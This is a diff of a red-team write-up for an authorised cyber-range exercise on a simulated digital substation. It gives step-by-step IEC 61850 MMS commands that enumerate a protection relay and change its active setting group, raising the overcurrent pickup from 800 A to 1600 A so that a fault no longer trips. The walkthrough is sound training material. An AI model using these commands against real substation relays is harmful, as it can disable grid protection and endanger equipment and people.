@@ -1,5 +1,24 @@
 # Prabal Urja | Scenario 05 | Red Team Write-up
 
+[Exercise overview](../../README.md) · [Scenario 5](../README.md) · [Other team](../Blue-Team/README.md)
+
+## Starting information
+
+Scenario 4 supplies the substation SCL engineering file identifying `PU-DSS-IED-01` and its protection model. Continue with the relay setting-group investigation.
+
+Use the address assigned to this scenario by the exercise platform or instructor. Each stage has its own assigned deployment. Follow the engineering clue to identify the next asset, then open that stage using its assigned address.
+
+**Terminal setup:** In Bash or Zsh, enter the assigned address when prompted. Commands below use `TARGET`; replace `<ip>` with the same address in browser URLs and graphical clients.
+
+```bash
+printf "Assigned scenario address: "
+read -r TARGET
+export TARGET
+```
+
+**Walkthrough:** Objective → discovery → protocol actions → operational impact → next scenario.
+
+
 **Challenge:** Native IEC 61850 protection setting-group manipulation  
 **Exercise type:** Authorised OT cyber-range, simulated digital substation  
 **Attack workstation:** Intel macOS, `PREKSHAs-MacBook-Air`  
@@ -50,7 +69,7 @@ The exercise started from the Mac, not from an interactive shell on the Ubuntu I
 **Required first reconnaissance step for the final participant write-up. Not present in the original screenshot set:** from the Mac, run a narrow authorised Nmap service scan against the allocated scenario host.
 
 ```bash
-nmap -Pn -sT -p 102,8098 --reason <ip>
+nmap -Pn -sT -p 102,8098 --reason "${TARGET}"
 ```
 
 **Why:** Identify whether the IEC 61850 MMS port is reachable and whether the simulated operator view is exposed. `-Pn` avoids reliance on ICMP discovery when the lab blocks ping; `-sT` uses a TCP connect scan; `-p` limits scope to the two relevant ports. Nmap alone cannot prove IEC 61850 application communication.
@@ -58,8 +77,7 @@ nmap -Pn -sT -p 102,8098 --reason <ip>
 **Observed TCP connectivity and native MMS discovery (the recorded live exercise started here):**
 
 ```bash
-export TARGET_IP=<ip>
-nc -G 3 -vz "$TARGET_IP" 102 && iec61850ctl list lds --host "$TARGET_IP" --port 102
+nc -G 3 -vz "${TARGET}" 102 && iec61850ctl list lds --host "${TARGET}" --port 102
 ```
 
 `nc` proved TCP/102 accepted the socket connection. The next command initiated a native MMS association and requested the available logical devices. The output included:
@@ -75,8 +93,8 @@ Found 1 logical device(s):
 ## 4. Enumerate the IEC 61850 model
 
 ```bash
-iec61850ctl list lns --host <ip> --port 102 --ld PU-DSS-IED-01LD0
-iec61850ctl get object --host <ip> --port 102 --object PU-DSS-IED-01LD0/PTOC1.Op.stVal --fc ST
+iec61850ctl list lns --host ${TARGET} --port 102 --ld PU-DSS-IED-01LD0
+iec61850ctl get object --host ${TARGET} --port 102 --object PU-DSS-IED-01LD0/PTOC1.Op.stVal --fc ST
 ```
 
 **Why:** Logical-device enumeration leads to logical-node enumeration; a read of `PTOC1.Op.stVal` establishes whether the protection element is currently reporting operation. `--fc ST` specifies status data, rather than a setpoint or control operation.
@@ -90,7 +108,7 @@ iec61850ctl get object --host <ip> --port 102 --object PU-DSS-IED-01LD0/PTOC1.Op
 The first MMS write used the wrong value type:
 
 ```bash
-iec61850ctl set object --host <ip> --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SGCB.ActSG' --fc SP --type int --value 2 --format json
+iec61850ctl set object --host ${TARGET} --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SGCB.ActSG' --fc SP --type int --value 2 --format json
 ```
 
 **Observed:** `write_ok: false` and `mms: data access error: TypeInconsistent`. The session and object reference were reachable, but the value did not conform to the server's expected MMS type. This is useful evidence of protocol-layer validation, not successful exploitation.
@@ -100,7 +118,7 @@ iec61850ctl set object --host <ip> --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SG
 The successful attempt used the client-supported unsigned type:
 
 ```bash
-iec61850ctl set object --host <ip> --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SGCB.ActSG' --fc SP --type uint --value 2 --format json
+iec61850ctl set object --host ${TARGET} --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SGCB.ActSG' --fc SP --type uint --value 2 --format json
 ```
 
 **What it does:** `set object` sends a protocol write for the active setting-group control; `--type uint` matches the relevant unsigned integer representation; `--value 2` selects the commissioning group. The server's libIEC61850 SGCB handler accepts valid groups 1 and 2 without verifying an independent change approval. This is the deliberately weak control in the lab.
@@ -116,8 +134,8 @@ iec61850ctl set object --host <ip> --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SG
 Read the setting-group field back over the industrial protocol, then observe the process model as an independent cross-check:
 
 ```bash
-iec61850ctl get object --host <ip> --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SGCB.ActSG' --fc SP
-curl -fsS http://<ip>:8098/api/state
+iec61850ctl get object --host ${TARGET} --port 102 --object 'PU-DSS-IED-01LD0/LLN0.SGCB.ActSG' --fc SP
+curl -fsS http://${TARGET}:8098/api/state
 ```
 
 **Observed:** MMS returned `Value: 2`. The simulated operator state showed `active_setting_group: 2`, `threshold_amps: 1600.0`, `protection_trip: false` and `breaker_closed: true`.
@@ -127,7 +145,7 @@ curl -fsS http://<ip>:8098/api/state
 To avoid relying only on the HMI, read the pickup setting *directly* using MMS:
 
 ```bash
-iec61850ctl get object --host <ip> --port 102 --object 'PU-DSS-IED-01LD0/PTOC1.StrVal.setMag' --fc SG
+iec61850ctl get object --host ${TARGET} --port 102 --object 'PU-DSS-IED-01LD0/PTOC1.StrVal.setMag' --fc SG
 ```
 
 **Observed:** `Value: 1600`. This is the strongest direct proof that the active simulated protection pickup changed from the approved 800 A value.
@@ -182,3 +200,9 @@ The original distributed TTP evaluated the native MMS read together with the ind
 | Final scorer | `SERVICE_STATUS:DOWN` | Lab's attack-impact condition satisfied |
 
 Likewise, a `DOWN` result caused only by an MMS process outage is not proof of setting-group manipulation.
+
+## Final stage
+
+This is the final stage: relate the selected protection group to the relay response under the instructor-applied 1300 A simulated fault.
+
+[Return to the exercise overview](../../README.md)
